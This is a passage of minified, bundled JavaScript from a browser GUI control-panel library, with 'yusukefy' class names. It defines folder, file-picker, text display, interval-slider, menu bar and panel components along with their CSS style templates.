                        var n = Object.freeze(Object.defineProperties(["\n\n.yusukefy-folder {\n    cursor: pointer;\n    padding-left: 0.5em;\n    color: ", ";\n}\n\n.yusukefy-folder div {\n    display: inline-block;\n    vertical-align: sub;\n    line-height: calc(", " + 5px);\n}\n\n.yusukefy-folder:hover,\n.yusukefy-folder:focus {\n    color: ", ";\n    background-color: ", ";\n    outline: none;\n}\n\n\n.yusukefy-folder-contents {\n    display: block;\n    box-sizing: border-box;\n    padding-left: 14px;\n    margin-bottom: 5px;\n    border-left: 2px solid ", ";\n}\n\n.yusukefy-folder-contents.yusukefy-folder-closed {\n    height: 0;\n    display: none;\n}\n\n\n"], {
                            raw: {
                                value: Object.freeze(["\n\n.yusukefy-folder {\n    cursor: pointer;\n    padding-left: 0.5em;\n    color: ", ";\n}\n\n.yusukefy-folder div {\n    display: inline-block;\n    vertical-align: sub;\n    line-height: calc(", " + 5px);\n}\n\n.yusukefy-folder:hover,\n.yusukefy-folder:focus {\n    color: ", ";\n    background-color: ", ";\n    outline: none;\n}\n\n\n.yusukefy-folder-contents {\n    display: block;\n    box-sizing: border-box;\n    padding-left: 14px;\n    margin-bottom: 5px;\n    border-left: 2px solid ", ";\n}\n\n.yusukefy-folder-contents.yusukefy-folder-closed {\n    height: 0;\n    display: none;\n}\n\n\n"])
                            }
                        }))
                            , r = i(1)
                            , i = i(3);
                        e.exports = i(n, r.theme.colors.textPrimary, r.theme.sizing.componentHeight, r.theme.colors.textHover, r.theme.colors.componentForeground, r.theme.colors.componentBackground)
                    }
                    , function (e, t, _) {
                        "use strict";
                        function i(e) {
                            return e && e.__esModule ? e : {
                                default: e
                            }
                        }
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        });
                        var n = function (e, t, i) {
                            return t && o(e.prototype, t),
                                i && o(e, i),
                                e
                        }
                            , r = i(_(4))
                            , E = i(_(0))
                            , u = _(68)
                            , r = function (e) {
                                function s(e, t, i, n) {
                                    var r, o, a;
                                    if (this instanceof s)
                                        return (r = function (e, t) {
                                            if (e)
                                                return !t || "object" != typeof t && "function" != typeof t ? e : t;
                                            throw new ReferenceError("this hasn't been initialised - super() hasn't been called")
                                        }(this, (s.__proto__ || Object.getPrototypeOf(s)).call(this))).opts = t,
                                            r.opts.fileReadFunc = r.opts.fileReadFunc || "readAsDataURL",
                                            r.file = null,
                                            r.fileName = null,
                                            r.container = _(2)(e, t.label, i),
                                            r.container.classList.add(u["yusukefy-file-container"]),
                                            r.container.setAttribute("role", "button"),
                                            r.container.setAttribute("tabIndex", "0"),
                                            (0,
                                                E.default)(r.container, {
                                                    width: "100%",
                                                    "box-sizing": "border-box",
                                                    "-moz-box-sizing": "border-box",
                                                    "-webkit-box-sizing": "border-box",
                                                    height: "unset",
                                                    padding: "8px"
                                                }),
                                            (e = r.container.appendChild(document.createElement("div"))).innerHTML = t.label,
                                            (0,
                                                E.default)(e, "padding-bottom", "5px"),
                                            (o = r.container.appendChild(document.createElement("input"))).setAttribute("type", "file"),
                                            o.setAttribute("multiple", !1),
                                            o.style.display = "none",
                                            t.label && o.setAttribute("aria-label", t.label),
                                            r.fileLabel = r.container.appendChild(document.createElement("div")),
                                            r.fileLabel.innerHTML = "Choose a file...",
                                            o.addEventListener("change", a = function (e) {
                                                e.dataTransfer ? t = e.dataTransfer.files : e.target && (t = e.target.files),
                                                    t[0];
                                                var t, i = new FileReader;
                                                i.onload = function () {
                                                    r.file = i.result,
                                                        r.fileLabel.innerHTML = t[0].name,
                                                        r.emit("input", r.file)
                                                }
                                                    ,
                                                    i[r.opts.fileReadFunc](t[0])
                                            }
                                            ),
                                            r.container.addEventListener("dragover", function (e) {
                                                e.preventDefault(),
                                                    e.stopPropagation(),
                                                    r.container.classList.add(u["yusukefy-dragover"])
                                            }),
                                            r.container.addEventListener("dragleave", function (e) {
                                                e.preventDefault(),
                                                    e.stopPropagation(),
                                                    r.container.classList.remove(u["yusukefy-dragover"])
                                            }),
                                            r.container.addEventListener("drop", function (e) {
                                                e.preventDefault(),
                                                    e.stopPropagation(),
                                                    r.container.classList.remove(u["yusukefy-dragover"]),
                                                    a(e)
                                            }),
                                            r.container.onclick = function () {
                                                o.click()
                                            }
                                            ,
                                            r.container.addEventListener("keydown", function (e) {
                                                13 !== e.which && 32 !== e.which || o.click()
                                            }),
                                            r.container.addEventListener("mouseup", function () {
                                                r.container.blur()
                                            }),
                                            r;
                                    throw new TypeError("Cannot call a class as a function")
                                }
                                var t = s;
                                if ("function" != typeof e && null !== e)
                                    throw new TypeError("Super expression must either be null or a function, not " + typeof e);
                                return t.prototype = Object.create(e && e.prototype, {
                                    constructor: {
                                        value: t,
                                        enumerable: !1,
                                        writable: !0,
                                        configurable: !0
                                    }
                                }),
                                    e && (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e),
                                    n(s, [{
                                        key: "SetValue",
                                        value: function (e) { }
                                    }, {
                                        key: "GetValue",
                                        value: function () {
                                            return this.file
                                        }
                                    }]),
                                    s
                            }(r.default);
                        function o(e, t) {
                            for (var i = 0; i < t.length; i++) {
                                var n = t[i];
                                n.enumerable = n.enumerable || !1,
                                    n.configurable = !0,
                                    "value" in n && (n.writable = !0),
                                    Object.defineProperty(e, n.key, n)
                            }
                        }
                        t.default = r,
                            e.exports = t.default
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = Object.freeze(Object.defineProperties(["\n\n.yusukefy-file-container {\n    display: inline-block;\n    outline: none;\n    padding-top: 8px;\n    padding-bottom: 8px;\n    color: ", ";\n    background-color: ", ";\n}\n\n.yusukefy-file-container:hover,\n.yusukefy-file-container:focus {\n    color: ", ";\n    background-color: ", ";\n}\n\n.yusukefy-file-container:active {\n    color: ", " !important;\n    background-color: ", " !important;\n}\n\n.yusukefy-dragover {\n    background-color: ", ";\n    box-shadow: inset 0 0 0 3px ", ";\n}\n\n\n"], {
                            raw: {
                                value: Object.freeze(["\n\n.yusukefy-file-container {\n    display: inline-block;\n    outline: none;\n    padding-top: 8px;\n    padding-bottom: 8px;\n    color: ", ";\n    background-color: ", ";\n}\n\n.yusukefy-file-container:hover,\n.yusukefy-file-container:focus {\n    color: ", ";\n    background-color: ", ";\n}\n\n.yusukefy-file-container:active {\n    color: ", " !important;\n    background-color: ", " !important;\n}\n\n.yusukefy-dragover {\n    background-color: ", ";\n    box-shadow: inset 0 0 0 3px ", ";\n}\n\n\n"])
                            }
                        }))
                            , r = i(1)
                            , i = i(3);
                        e.exports = i(n, r.theme.colors.textPrimary, r.theme.colors.componentBackground, r.theme.colors.textHover, r.theme.colors.componentForeground, r.theme.colors.textActive, r.theme.colors.componentActive, r.theme.colors.componentBackground, r.theme.colors.componentForeground)
                    }
                    , function (e, t, r) {
                        "use strict";
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        });
                        var i = function (e, t, i) {
                            return t && s(e.prototype, t),
                                i && s(e, i),
                                e
                        }
                            , n = r(0)
                            , o = n && n.__esModule ? n : {
                                default: n
                            };
                        function a(e, t, i, n) {
                            if (!(this instanceof a))
                                throw new TypeError("Cannot call a class as a function");
                            this.opts = t,
                                this.container = r(2)(e, t.label, i),
                                r(5)(this.container, t.label, i),
                                this.text = this.container.appendChild(document.createElement("div")),
                                (0,
                                    o.default)(this.text, {
                                        display: "inline-block",
                                        height: "unset",
                                        width: "calc(100% - " + i.sizing.labelWidth + ")",
                                        border: "none",
                                        color: i.colors.textSecondary,
                                        fontFamily: "inherit",
                                        "box-sizing": "border-box",
                                        "-moz-box-sizing": "border-box",
                                        "-webkit-box-sizing": "border-box",
                                        verticalAlign: "sub",
                                        "line-height": i.sizing.componentHeight,
                                        "user-select": "text"
                                    }),
                                t.label && this.text.setAttribute("aria-label", t.label)
                        }
                        function s(e, t) {
                            for (var i = 0; i < t.length; i++) {
                                var n = t[i];
                                n.enumerable = n.enumerable || !1,
                                    n.configurable = !0,
                                    "value" in n && (n.writable = !0),
                                    Object.defineProperty(e, n.key, n)
                            }
                        }
                        i(a, [{
                            key: "SetValue",
                            value: function (e) {
                                this.text.innerHTML = e.toString()
                            }
                        }, {
                            key: "GetValue",
                            value: function () {
                                return this.text.innerHTML.toString()
                            }
                        }]),
                            t.default = a,
                            e.exports = t.default
                    }
                    , function (e, t, E) {
                        "use strict";
                        function i(e) {
                            return e && e.__esModule ? e : {
                                default: e
                            }
                        }
                        function u(e, t, i) {
                            return Math.min(Math.max(e, t), i)
                        }
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        });
                        var n = function (e, t, i) {
                            return t && o(e.prototype, t),
                                i && o(e, i),
                                e
                        }
                            , r = i(E(4))
                            , d = i(E(0))
                            , T = i(E(10))
                            , A = E(71)
                            , r = function (e) {
                                function _(e, n, t, i) {
                                    if (!(this instanceof _))
                                        throw new TypeError("Cannot call a class as a function");
                                    var r = function (e, t) {
                                        if (e)
                                            return !t || "object" != typeof t && "function" != typeof t ? e : t;
                                        throw new ReferenceError("this hasn't been initialised - super() hasn't been called")
                                    }(this, (_.__proto__ || Object.getPrototypeOf(_)).call(this));
                                    if (r.opts = n,
                                        r.container = E(2)(e, n.label, t),
                                        E(5)(r.container, n.label, t),
                                        n.step && n.steps)
                                        throw new Error("Cannot specify both step and steps. Got step = " + n.step + ", steps = ", n.steps);
                                    if (r.input = r.container.appendChild(document.createElement("span")),
                                        r.input.className = A["yusukefy-interval"],
                                        r.handle = document.createElement("span"),
                                        r.handle.className = A["yusukefy-interval-handle"],
                                        r.input.appendChild(r.handle),
                                        Array.isArray(n.initial) || (n.initial = []),
                                        "log" === n.scale) {
                                        if (n.max = (0,
                                            T.default)(n.max) ? n.max : 100,
                                            n.min = (0,
                                                T.default)(n.min) ? n.min : .1,
                                            n.min * n.max <= 0)
                                            throw new Error("Log range min/max must have the same sign and not equal zero. Got min = " + n.min + ", max = " + n.max);
                                        if (r.logmin = n.min,
                                            r.logmax = n.max,
                                            r.logsign = 0 < n.min ? 1 : -1,
                                            r.logmin = Math.abs(r.logmin),
                                            r.logmax = Math.abs(r.logmax),
                                            n.min = 0,
                                            n.max = 100,
                                            (0,
                                                T.default)(n.step))
                                            throw new Error("Log may only use steps (integer number of steps), not a step value. Got step =" + n.step);
                                        if (n.step = 1,
                                            n.initial = [r.InverseScaleValue((0,
                                                T.default)(n.initial) ? n.initial[0] : scaleValue(n.min + .25 * (n.max - n.min))), r.InverseScaleValue((0,
                                                    T.default)(n.initial) ? n.initial[1] : scaleValue(n.min + .75 * (n.max - n.min)))],
                                            r.ScaleValue(n.initial[0]) * r.ScaleValue(n.max) <= 0 || scaleValue(n.initial[1]) * r.ScaleValue(n.max) <= 0)
                                            throw new Error("Log range initial value must have the same sign as min/max and must not equal zero. Got initial value = [" + r.ScaleValue(n.initial[0]) + ", " + r.ScaleValue(n.initial[1]) + "]")
                                    } else
                                        n.max = (0,
                                            T.default)(n.max) ? n.max : 100,
                                            n.min = (0,
                                                T.default)(n.min) ? n.min : 0,
                                            n.step = (0,
                                                T.default)(n.step) ? n.step : .01,
                                            n.initial = [(0,
                                                T.default)(n.initial[0]) ? n.initial[0] : .25 * (n.min + n.max), (0,
                                                    T.default)(n.initial[1]) ? n.initial[1] : .75 * (n.min + n.max)];
                                    (0,
                                        T.default)(n.steps) && (n.step = (0,
                                            T.default)(n.steps) ? (n.max - n.min) / n.steps : n.step),
                                        n.initial[0] = n.min + n.step * Math.round((n.initial[0] - n.min) / n.step),
                                        n.initial[1] = n.min + n.step * Math.round((n.initial[1] - n.min) / n.step),
                                        r.value = n.initial,
                                        (0,
                                            d.default)(r.handle, {
                                                left: (r.value[0] - n.min) / (n.max - n.min) * 100 + "%",
                                                right: 100 - (r.value[1] - n.min) / (n.max - n.min) * 100 + "%"
                                            }),
                                        r.lValue = E(6)(r.container, r.ScaleValue(n.initial[0]), t, "11%", !0),
                                        r.rValue = E(6)(r.container, r.ScaleValue(n.initial[1]), t, "11%"),
                                        n.label && r.lValue.setAttribute("aria-label", n.label + " lower value"),
                                        n.label && r.lValue.setAttribute("aria-label", n.label + " upper value"),
                                        r.activeIndex = -1,
                                        setTimeout(function () {
                                            var e = r.ScaleValue(r.value[0])
                                                , t = r.ScaleValue(r.value[1]);
                                            r.lValue.innerHTML = e,
                                                r.rValue.innerHTML = t,
                                                r.emit("initialized", [e, t])
                                        }),
                                        r.input.addEventListener("focus", function () {
                                            r.focused = !0
                                        }),
                                        r.input.addEventListener("blur", function () {
                                            r.focused = !1
                                        });
                                    function o(e) {
                                        e = u(a(e) / r.input.offsetWidth, 0, 1),
                                            r.setActiveValue(e),
                                            document.removeEventListener("mousemove", s),
                                            document.removeEventListener("mouseup", o),
                                            r.activeIndex = -1
                                    }
                                    var a = function (e) {
                                        return e.pageX - r.input.getBoundingClientRect().left
                                    }
                                        , s = function (e) {
                                            e = u(a(e) / r.input.offsetWidth, 0, 1);
                                            r.setActiveValue(e)
                                        };
                                    return r.input.addEventListener("mousedown", function (e) {
                                        var e = u(a(e) / r.input.offsetWidth, 0, 1)
                                            , t = (r.value[0] - n.min) / (n.max - n.min)
                                            , i = (r.value[1] - n.min) / (n.max - n.min)
                                            , t = (t -= 1e-15 * Math.abs(n.max - n.min),
                                                i += 1e-15 * Math.abs(n.max - n.min),
                                                Math.abs(t - e))
                                            , i = Math.abs(i - e);
                                        r.activeIndex = t < i ? 0 : 1,
                                            console.log(r.activeIndex),
                                            document.addEventListener("mousemove", s),
                                            document.addEventListener("mouseup", o)
                                    }),
                                        r.input.addEventListener("mouseup", function () {
                                            r.input.blur()
                                        }),
                                        r.input.oninput = function () {
                                            var e = r.ScaleValue(r.value[0])
                                                , t = r.ScaleValue(r.value[1]);
                                            r.lValue.value = e,
                                                r.rValue.value = t,
                                                r.emit("input", [e, t])
                                        }
                                        ,
                                        r.lValue.onchange = function () {
                                            var e = r.lValue.value
                                                , t = parseFloat(r.rValue.value);
                                            Number(parseFloat(e)) == e ? (e = parseFloat(e),
                                                e = Math.min(Math.max(e, n.min), n.max),
                                                e = Math.ceil((e - n.min) / n.step) * n.step + n.min,
                                                e = Math.min(e, t),
                                                r.lValue.value = e,
                                                r.emit("input", [e, t]),
                                                r.RefreshHandle([e, t])) : r.lValue.value = r.lastValue[0]
                                        }
                                        ,
                                        r.rValue.onchange = function () {
                                            var e = r.rValue.value
                                                , t = parseFloat(r.lValue.value);
                                            Number(parseFloat(e)) == e ? (e = parseFloat(e),
                                                e = Math.min(Math.max(e, n.min), n.max),
                                                e = Math.ceil((e - n.min) / n.step) * n.step + n.min,
                                                e = Math.max(e, t),
                                                r.rValue.value = e,
                                                r.emit("input", [t, e]),
                                                r.RefreshHandle([t, e])) : r.rValue.value = r.lastValue[1]
                                        }
                                        ,
                                        r
                                }
                                var t = _;
                                if ("function" != typeof e && null !== e)
                                    throw new TypeError("Super expression must either be null or a function, not " + typeof e);
                                return t.prototype = Object.create(e && e.prototype, {
                                    constructor: {
                                        value: t,
                                        enumerable: !1,
                                        writable: !0,
                                        configurable: !0
                                    }
                                }),
                                    e && (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e),
                                    n(_, [{
                                        key: "ScaleValue",
                                        value: function (e) {
                                            return "log" === this.opts.scale ? this.logsign * Math.exp(Math.log(this.logmin) + (Math.log(this.logmax) - Math.log(this.logmin)) * e / 100) : e
                                        }
                                    }, {
                                        key: "InverseScaleValue",
                                        value: function (e) {
                                            return "log" === this.opts.scale ? 100 * (Math.log(e * this.logsign) - Math.log(this.logmin)) / (Math.log(this.logmax) - Math.log(this.logmin)) : e
                                        }
                                    }, {
                                        key: "setActiveValue",
                                        value: function (e) {
                                            var t, i, n;
                                            -1 !== this.activeIndex && (t = this.opts,
                                                i = (this.value[0] - t.min) / (t.max - t.min),
                                                n = (this.value[1] - t.min) / (t.max - t.min),
                                                e = 0 === this.activeIndex ? Math.min(n, e) : Math.max(i, e),
                                                n = t.min + Math.round((t.max - t.min) * e / t.step) * t.step,
                                                this.value[this.activeIndex] = n,
                                                (0,
                                                    d.default)(this.handle, {
                                                        left: (this.value[0] - t.min) / (t.max - t.min) * 100 + "%",
                                                        right: 100 - (this.value[1] - t.min) / (t.max - t.min) * 100 + "%"
                                                    }),
                                                this.input.oninput())
                                        }
                                    }, {
                                        key: "SetValue",
                                        value: function (e) {
                                            !0 !== this.focused && (this.lValue.value = this.FormatNumber(e[0]),
                                                this.rValue.value = this.FormatNumber(e[1]),
                                                this.lastValue = [this.lValue.value, this.rValue.value])
                                        }
                                    }, {
                                        key: "FormatNumber",
                                        value: function (e) {
                                            return e.toFixed(3).replace(/\.?0*$/, "")
                                        }
                                    }, {
                                        key: "GetValue",
                                        value: function () {
                                            return [this.lValue.value, this.rValue.value]
                                        }
                                    }, {
                                        key: "RefreshHandle",
                                        value: function (e) {
                                            var t = (parseFloat(e[0]) - this.opts.min) / (this.opts.max - this.opts.min) * 100
                                                , e = 100 - (parseFloat(e[1]) - this.opts.min) / (this.opts.max - this.opts.min) * 100;
                                            (0,
                                                d.default)(this.handle, {
                                                    left: t + "%",
                                                    right: e + "%"
                                                })
                                        }
                                    }]),
                                    _
                            }(r.default);
                        function o(e, t) {
                            for (var i = 0; i < t.length; i++) {
                                var n = t[i];
                                n.enumerable = n.enumerable || !1,
                                    n.configurable = !0,
                                    "value" in n && (n.writable = !0),
                                    Object.defineProperty(e, n.key, n)
                            }
                        }
                        t.default = r,
                            e.exports = t.default
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = Object.freeze(Object.defineProperties(["\n.yusukefy-interval {\n    -webkit-appearance: none;\n    position: absolute;\n    height: 20px;\n    margin: 0px 0;\n    width: 33%;\n    left: 54.5%;\n    background-color: ", ";\n    cursor: ew-resize;\n\n    -webkit-touch-callout: none;\n    -webkit-user-select: none;\n    -khtml-user-select: none;\n    -moz-user-select: none;\n    -ms-user-select: none;\n    user-select: none;\n}\n.yusukefy-interval-handle {\n    background-color: ", ";\n    position: absolute;\n    height: ", ";\n    min-width: 1px;\n}\n.yusukefy-interval-handle:focus {\n    background: ", ";\n}\n"], {
                            raw: {
                                value: Object.freeze(["\n.yusukefy-interval {\n    -webkit-appearance: none;\n    position: absolute;\n    height: 20px;\n    margin: 0px 0;\n    width: 33%;\n    left: 54.5%;\n    background-color: ", ";\n    cursor: ew-resize;\n\n    -webkit-touch-callout: none;\n    -webkit-user-select: none;\n    -khtml-user-select: none;\n    -moz-user-select: none;\n    -ms-user-select: none;\n    user-select: none;\n}\n.yusukefy-interval-handle {\n    background-color: ", ";\n    position: absolute;\n    height: ", ";\n    min-width: 1px;\n}\n.yusukefy-interval-handle:focus {\n    background: ", ";\n}\n"])
                            }
                        }))
                            , r = i(1)
                            , i = i(3)
                            , o = r.theme.colors.componentBackground
                            , a = r.theme.colors.componentForeground
                            , s = r.theme.colors.componentActive;
                        e.exports = i(n, o, a, r.theme.sizing.componentHeight, s)
                    }
                    , function (e, t, o) {
                        "use strict";
                        function i(e) {
                            return e && e.__esModule ? e : {
                                default: e
                            }
                        }
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        }),
                            t.MenuBar = void 0;
                        var n = function (e, t, i) {
                            return t && _(e.prototype, t),
                                i && _(e, i),
                                e
                        }
                            , a = i(o(0))
                            , r = i(o(4));
                        o(1);
                        var s = i(o(15));
                        function _(e, t) {
                            for (var i = 0; i < t.length; i++) {
                                var n = t[i];
                                n.enumerable = n.enumerable || !1,
                                    n.configurable = !0,
                                    "value" in n && (n.writable = !0),
                                    Object.defineProperty(e, n.key, n)
                            }
                        }
                        t.MenuBar = function (e) {
                            function r(e, t) {
                                var i, n;
                                if (this instanceof r)
                                    return i = function (e, t) {
                                        if (e)
                                            return !t || "object" != typeof t && "function" != typeof t ? e : t;
                                        throw new ReferenceError("this hasn't been initialised - super() hasn't been called")
                                    }(this, (r.__proto__ || Object.getPrototypeOf(r)).call(this)),
                                        n = o(73),
                                        i.element = document.createElement("div"),
                                        i.element.className = n["yusukefy-bar"],
                                        e.appendChild(i.element),
                                        t.title && ((e = i.element.appendChild(document.createElement("div"))).className = n["yusukefy-bar-title"],
                                            e.innerHTML = t.title),
                                        (e = i.element.appendChild(document.createElement("button"))).className = n["yusukefy-bar-button"],
                                        e.innerHTML = "Controls",
                                        (0,
                                            a.default)(e, {
                                                left: "left" == t.align ? "0" : "unset",
                                                right: "left" == t.align ? "unset" : "0"
                                            }),
                                        e.onclick = function () {
                                            i.emit("ontogglepanel")
                                        }
                                        ,
                                        s.default.isEnabled && ((e = i.element.appendChild(document.createElement("button"))).className = n["yusukefy-bar-button"],
                                            e.innerHTML = "「　」",
                                            e.setAttribute("aria-label", "Toggle Fullscreen"),
                                            (0,
                                                a.default)(e, {
                                                    left: "left" == t.align ? "unset" : "0",
                                                    right: "left" == t.align ? "0" : "unset"
                                                }),
                                            e.onclick = function () {
                                                i.emit("onfullscreenrequested")
                                            }
                                        ),
                                        i;
                                throw new TypeError("Cannot call a class as a function")
                            }
                            var t = r;
                            if ("function" != typeof e && null !== e)
                                throw new TypeError("Super expression must either be null or a function, not " + typeof e);
                            return t.prototype = Object.create(e && e.prototype, {
                                constructor: {
                                    value: t,
                                    enumerable: !1,
                                    writable: !0,
                                    configurable: !0
                                }
                            }),
                                e && (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e),
                                n(r, [{
                                    key: "SetVisible",
                                    value: function (e) {
                                        this.element.style.display = e ? "block" : "none"
                                    }
                                }]),
                                r
                        }(r.default)
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = Object.freeze(Object.defineProperties(["\n\n.yusukefy-bar {\n    background-color: ", ";\n    height: ", ";\n    width: 100%;\n    opacity: 1.0;\n    position: relative;\n    cursor: default;\n}\n\n.yusukefy-bar-title {\n    color: ", ";\n    text-align: center;\n    width: 100%;\n    position: absolute;\n    top: 0;\n    line-height: ", ";\n    color: ", ";\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    -ms-user-select: none;\n    user-select: none;\n}\n\n.yusukefy-bar-button {\n    text-align: center;\n    border: none;\n    cursor: pointer;\n    font-family: inherit;\n    height: 100%;\n    position: absolute;\n    top: 0;\n    color: ", ";\n    background-color: ", ";\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    -ms-user-select: none;\n    user-select: none;\n    margin: 0;\n\n}\n\n/* Hide default accessibility outlines since we're providing our own visual feedback */\n.yusukefy-bar-button:focus {\n    outline:none;\n}\n.yusukefy-bar-button::-moz-focus-inner {\n    border:0;\n}\n\n.yusukefy-bar-button:hover,\n.yusukefy-bar-button:focus {\n    color: ", ";\n    background-color: ", ";\n}\n\n.yusukefy-bar-button:active {\n    color: ", " !important;\n    background-color: ", " !important;\n}\n\n\n"], {
                            raw: {
                                value: Object.freeze(["\n\n.yusukefy-bar {\n    background-color: ", ";\n    height: ", ";\n    width: 100%;\n    opacity: 1.0;\n    position: relative;\n    cursor: default;\n}\n\n.yusukefy-bar-title {\n    color: ", ";\n    text-align: center;\n    width: 100%;\n    position: absolute;\n    top: 0;\n    line-height: ", ";\n    color: ", ";\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    -ms-user-select: none;\n    user-select: none;\n}\n\n.yusukefy-bar-button {\n    text-align: center;\n    border: none;\n    cursor: pointer;\n    font-family: inherit;\n    height: 100%;\n    position: absolute;\n    top: 0;\n    color: ", ";\n    background-color: ", ";\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    -ms-user-select: none;\n    user-select: none;\n    margin: 0;\n\n}\n\n/* Hide default accessibility outlines since we're providing our own visual feedback */\n.yusukefy-bar-button:focus {\n    outline:none;\n}\n.yusukefy-bar-button::-moz-focus-inner {\n    border:0;\n}\n\n.yusukefy-bar-button:hover,\n.yusukefy-bar-button:focus {\n    color: ", ";\n    background-color: ", ";\n}\n\n.yusukefy-bar-button:active {\n    color: ", " !important;\n    background-color: ", " !important;\n}\n\n\n"])
                            }
                        }))
                            , r = i(1)
                            , i = i(3);
                        e.exports = i(n, r.theme.colors.menuBarBackground, r.theme.sizing.menuBarHeight, r.theme.colors.text1, r.theme.sizing.menuBarHeight, r.theme.colors.menuBarText, r.theme.colors.textPrimary, r.theme.colors.componentBackground, r.theme.colors.textHover, r.theme.colors.componentForeground, r.theme.colors.textActive, r.theme.colors.componentActive)
                    }
                    , function (e, t, i) {
                        "use strict";
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        }),
                            t.Panel = void 0;
                        var n = function (e, t, i) {
                            return t && s(e.prototype, t),
                                i && s(e, i),
                                e
                        }
                            , r = i(0)
                            , o = r && r.__esModule ? r : {
                                default: r
                            }
                            , a = i(1);
                        function s(e, t) {
                            for (var i = 0; i < t.length; i++) {
                                var n = t[i];
                                n.enumerable = n.enumerable || !1,
                                    n.configurable = !0,
                                    "value" in n && (n.writable = !0),
                                    Object.defineProperty(e, n.key, n)
                            }
                        }
                        function _(e, t) {
                            if (!(this instanceof _))
                                throw new TypeError("Cannot call a class as a function");
                            this.opts = t,
                                this.styles = i(75),
                                this.container = e.appendChild(document.createElement("div")),
                                this.container.className = this.styles["yusukefy-panel-container"],
                                (0,
                                    o.default)(this.container, {
                                        width: t.width,
                                        opacity: t.opacity || 1,
                                        left: "left" == t.align ? "0" : "unset",
                                        right: "left" == t.align ? "unset" : "0"
                                    }),
                                "outer" == t.panelMode && (0,
                                    o.default)(this.container, {
                                        left: "left" == t.align ? "unset" : "100%",
                                        right: "left" == t.align ? "100%" : "unset"
                                    }),
                                "none" === t.barMode && this._MakeToggleButton(),
                                this.panel = this.container.appendChild(document.createElement("div")),
                                this.panel.className = this.styles["yusukefy-panel"],
                                "none" === t.barMode && t.title && i(76)(this.panel, t.title, a.theme)
                        }
                        t.Panel = (n(_, [{
                            key: "SetVisible",
                            value: function (e) {
                                e ? (this.panel.classList.remove(this.styles["yusukefy-panel-hidden"]),
                                    this.menuButton && this.menuButton.setAttribute("alt", "Close GUI")) : (this.panel.classList.add(this.styles["yusukefy-panel-hidden"]),
                                        this.menuButton && this.menuButton.setAttribute("alt", "Open GUI"))
                            }
                        }, {
                            key: "ToggleVisible",
                            value: function () {
                                this.panel.classList.contains(this.styles["yusukefy-panel-hidden"]) ? this.SetVisible(!0) : this.SetVisible(!1)
                            }
                        }, {
                            key: "_MakeToggleButton",
                            value: function () {
                                var e = this;
                                this.menuButton = this.container.appendChild(document.createElement("button")),
                                    this.menuButton.className = this.styles["yusukefy-panel-toggle-button"],
                                    (0,
                                        o.default)(this.menuButton, {
                                            left: "left" == this.opts.align ? "0px" : "unset",
                                            right: "left" == this.opts.align ? "unset" : "0px"
                                        }),
                                    this.menuButton.onclick = function () {
                                        e.ToggleVisible()
                                    }
                                    ,
                                    this.menuButton.addEventListener("mouseup", function () {
                                        e.menuButton.blur()
                                    }),
                                    this.menuButton.innerHTML = '\n        <svg width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">\n            <rect x="10%" y="10%" width="80%" height="80%"/>\n        </svg>\n        '
                            }
                        }]),
                            _)
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = Object.freeze(Object.defineProperties(["\n\n.yusukefy-panel-container {\n    position: absolute;\n    background: ", ";\n}\n\n.yusukefy-panel {\n    padding: 14px;\n    /* Last component will have a margin, so reduce padding to account for this */\n    padding-bottom: calc(14px - ", ");\n\n    /* all: initial;  */\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    -ms-user-select: none;\n    user-select: none;\n    cursor: default;\n    text-align: left;\n    box-sizing: border-box;\n}\n\n.yusukefy-panel.yusukefy-panel-hidden {\n    height: 0px;\n    display: none;\n}\n\n.yusukefy-panel * {\n    box-sizing: initial;\n    -webkit-box-sizing: initial;\n    -moz-box-sizing: initial;\n}\n\n.yusukefy-panel input {\n    font-family: 'Hack';\n    font-size: 11px;\n    display: inline;\n}\n\n.yusukefy-panel a {\n    color: inherit;\n    text-decoration: none;\n}\n\n.yusukefy-panel-toggle-button {\n    position: absolute;\n    top: 0;\n    margin: 0;\n    padding: 0;\n    width: 15px;\n    height: 15px;\n    line-height: 15px;\n    text-align: center;\n    border: none;\n    cursor: pointer;\n    font-family: inherit;\n    color: ", ";\n    background-color: ", ";\n\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    -ms-user-select: none;\n    user-select: none;\n\n}\n\n/* Open/Close button styling */\n.yusukefy-panel-toggle-button svg {\n    fill-opacity: 0;\n    stroke-width: 3;\n    stroke: ", ";\n}\n\n/* Remove browser default outlines since we're providing our own */\n.yusukefy-panel-toggle-button:focus {\n    outline:none;\n}\n.yusukefy-panel-toggle-button::-moz-focus-inner {\n    border: 0;\n}\n\n.yusukefy-panel-toggle-button:hover,\n.yusukefy-panel-toggle-button:focus {\n    color: ", ";\n    background-color: ", ";\n}\n\n.yusukefy-panel-toggle-button:active {\n    color: ", ";\n    background-color: ", ";\n}\n\n"], {
                            raw: {
